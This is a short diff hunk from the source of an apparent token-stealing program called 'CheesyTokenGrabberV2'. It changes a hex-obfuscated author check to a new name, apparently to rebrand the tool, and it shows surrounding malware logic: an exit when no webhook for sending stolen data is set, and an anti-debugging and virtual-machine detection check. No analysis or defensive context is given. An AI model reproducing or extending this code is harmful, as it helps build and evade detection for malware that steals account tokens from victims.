@@ -265,7 +265,7 @@ class CheesyTokenGrabberV2(Functions):
         if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
             self.cheesy_exit()
 
-        if __author__ != "\x52\x64\x69\x6d\x6f":
+        if __author__ != "bananaman2020":
             self.cheesy_exit()
 
         if self.fetch_conf("anti_debug") and AntiDebug().inVM is True:
